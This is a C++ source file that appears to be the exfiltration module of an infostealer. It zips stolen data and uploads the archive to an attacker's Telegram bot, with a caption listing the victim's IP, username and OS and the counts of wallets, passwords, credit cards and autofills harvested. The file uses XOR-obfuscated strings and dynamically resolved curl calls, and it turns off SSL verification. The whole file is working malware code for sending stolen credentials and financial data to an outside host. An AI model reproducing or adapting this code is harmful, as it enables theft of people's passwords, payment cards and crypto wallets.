#include "bot.h"

#include "../utilities/xor/xor.h"
#include "../utilities/globals/globals.h"
#include "../utilities/tools/tools.h"

#include "../winapi/winapi.h"
#include "../work/geolocation/geolocation.h"

#include <curl/curl.h>
#include <sstream>
#include <string>
#include <fstream>

tgbot g_tgbot;

void tgbot::send_details(std::string bot_token, std::string telegram_id)
{
	std::string byte_data;
	std::stringstream message_data;
	std::string telegram_post_request;

	CURL *curl;
	CURLcode curl_status;

	struct curl_httppost *form_post = 0;
	struct curl_httppost *last_ptr = 0;
	struct curl_slist *header_list = 0;

	std::string archive_name = g_geolocation.m_country_code + g_tools.random_string(32,
		XOR_STRING("ABCDEFGHIJKLMNPRSTUVWXYZ111888777")).c_str() + XOR_STRING("_EL") + std::string(XOR_STRING(".zip"));

	std::ifstream in(g_globals.zip_path.c_str(), std::ios::in | std::ios::binary);

	if (in)
	{
		in.seekg(0, std::ios::end);
		byte_data.resize(in.tellg());
		in.seekg(0, std::ios::beg);
		in.read(&byte_data[0], byte_data.size());
		in.close();
	}

	std::string new_line = std::string(XOR_STRING("%0A"));

	message_data <<
		std::string(XOR_STRING("\xF0\x9F\x9A\xA9 IP - ")) << g_geolocation.m_ip << XOR_STRING(" (") << std::string(XOR_STRING("\xF0\x9F\x8C\x90 ")) << g_geolocation.m_country << XOR_STRING(")") << new_line <<
		std::string(XOR_STRING("\xF0\x9F\x91\xA4 Username - ")) << g_tools.get_user_name().c_str() << new_line <<
		std::string(XOR_STRING("\xF0\x9F\x92\xBB OS - ")) << g_tools.get_os_name().c_str() << new_line <<
		std::string(XOR_STRING("\xF0\x9F\x93\x81 Installed path - ")) << g_tools.get_program_dir().c_str() << new_line << new_line <<
		std::string(XOR_STRING("\xF0\x9F\x92\xB5 Wallets found: ")) << std::to_string(g_globals.wallets_count) << new_line <<
		std::string(XOR_STRING("\xF0\x9F\x8E\xAE Apps found: ")) << std::to_string(g_globals.apps_count) << new_line <<
		std::string(XOR_STRING("\xF0\x9F\x94\xA7 Utilities found: ")) << std::to_string(g_globals.utilities_count) << new_line <<
		std::string(XOR_STRING("\xF0\x9F\x92\xB3 Credit cards found: ")) << std::to_string(g_globals.credit_cards_count) << new_line <<
		std::string(XOR_STRING("\xF0\x9F\x94\x91 Passwords found: ")) << std::to_string(g_globals.passwords_count) << new_line <<
		std::string(XOR_STRING("\xF0\x9F\x93\x93 Autofills found: ")) << std::to_string(g_globals.autofill_count) << new_line << new_line <<

		std::string(XOR_STRING("More info you can found in ")) << g_tools.instruction_file.c_str() << new_line <<
		std::string(XOR_STRING("Regards, EL."));

	telegram_post_request = std::string(XOR_STRING("https://api.telegram.org/bot")) + bot_token.c_str() +
		std::string(XOR_STRING("/sendDocument?chat_id=")) + telegram_id.c_str() + std::string(XOR_STRING("&caption=")) + message_data.str();

	typedef CURLcode(WINAPI* curl_global_init_t)(long flags);
	typedef CURL*(WINAPI* curl_easy_init_t)(void);
	typedef CURLcode(WINAPI* curl_easy_perform_t)(CURL *curl);
	typedef void(WINAPI* curl_easy_cleanup_t)(CURL *curl);
	typedef void(WINAPI* curl_formfree_t)(struct curl_httppost *form);
	typedef void(WINAPI* curl_global_cleanup_t)(void);
	typedef CURLFORMcode(WINAPI* curl_formadd_t)(struct curl_httppost **httppost, struct curl_httppost **last_post, ...);
	typedef curl_slist*(WINAPI* curl_slist_append_t)(struct curl_slist *, const char *);
	typedef CURLcode(WINAPI* curl_easy_setopt_t)(CURL *curl, CURLoption option, ...);
	typedef void(WINAPI* curl_slist_free_all_t)(struct curl_slist *);

	LPVOID curl_global_init_address = g_winapi._GetProcAddress(g_globals.curl_module, XOR_STRING("curl_global_init"));
	curl_global_init_t curl_global_init = (curl_global_init_t)curl_global_init_address;

	LPVOID curl_easy_init_address = g_winapi._GetProcAddress(g_globals.curl_module, XOR_STRING("curl_easy_init"));
	curl_easy_init_t curl_easy_init = (curl_easy_init_t)curl_easy_init_address;

	LPVOID curl_easy_perform_address = g_winapi._GetProcAddress(g_globals.curl_module, XOR_STRING("curl_easy_perform"));
	curl_easy_perform_t curl_easy_perform = (curl_easy_perform_t)curl_easy_perform_address;

	LPVOID curl_easy_cleanup_address = g_winapi._GetProcAddress(g_globals.curl_module, XOR_STRING("curl_easy_cleanup"));
	curl_easy_cleanup_t curl_easy_cleanup = (curl_easy_cleanup_t)curl_easy_cleanup_address;

	LPVOID curl_formfree_address = g_winapi._GetProcAddress(g_globals.curl_module, XOR_STRING("curl_formfree"));
	curl_formfree_t curl_formfree = (curl_formfree_t)curl_formfree_address;

	LPVOID curl_global_cleanup_address = g_winapi._GetProcAddress(g_globals.curl_module, XOR_STRING("curl_global_cleanup"));
	curl_global_cleanup_t curl_global_cleanup = (curl_global_cleanup_t)curl_global_cleanup_address;

	LPVOID curl_formadd_address = g_winapi._GetProcAddress(g_globals.curl_module, XOR_STRING("curl_formadd"));
	curl_formadd_t curl_formadd = (curl_formadd_t)curl_formadd_address;

	LPVOID curl_slist_append_address = g_winapi._GetProcAddress(g_globals.curl_module, XOR_STRING("curl_slist_append"));
	curl_slist_append_t curl_slist_append = (curl_slist_append_t)curl_slist_append_address;

	LPVOID curl_easy_setopt_address = g_winapi._GetProcAddress(g_globals.curl_module, XOR_STRING("curl_easy_setopt"));
	curl_easy_setopt_t curl_easy_setopt = (curl_easy_setopt_t)curl_easy_setopt_address;

	LPVOID curl_slist_free_all_address = g_winapi._GetProcAddress(g_globals.curl_module, XOR_STRING("curl_slist_free_all"));
	curl_slist_free_all_t curl_slist_free_all = (curl_slist_free_all_t)curl_slist_free_all_address;

	curl_global_init(CURL_GLOBAL_ALL);

	curl_formadd(&form_post, &last_ptr, CURLFORM_COPYNAME, XOR_STRING("cache-control:"),
		CURLFORM_COPYCONTENTS, XOR_STRING("no-cache"), CURLFORM_END);

	curl_formadd(&form_post, &last_ptr, CURLFORM_COPYNAME, XOR_STRING("content-type:"),
		CURLFORM_COPYCONTENTS, XOR_STRING("multipart/form-data"), CURLFORM_END);

	curl_formadd(&form_post, &last_ptr, CURLFORM_COPYNAME, XOR_STRING("document"),
		CURLFORM_BUFFER, archive_name.c_str(), CURLFORM_BUFFERPTR, byte_data.data(),
		CURLFORM_BUFFERLENGTH, byte_data.size(), CURLFORM_END);

	curl = curl_easy_init();
	header_list = curl_slist_append(header_list, 0);

	if (curl)
	{
		curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);

		curl_easy_setopt(curl, CURLOPT_URL, telegram_post_request.c_str());
		curl_easy_setopt(curl, CURLOPT_HTTPPOST, form_post);

		curl_status = curl_easy_perform(curl);

		curl_easy_cleanup(curl);
		curl_formfree(form_post);
		curl_slist_free_all(header_list);
	}

	curl_global_cleanup();
	in.close();
}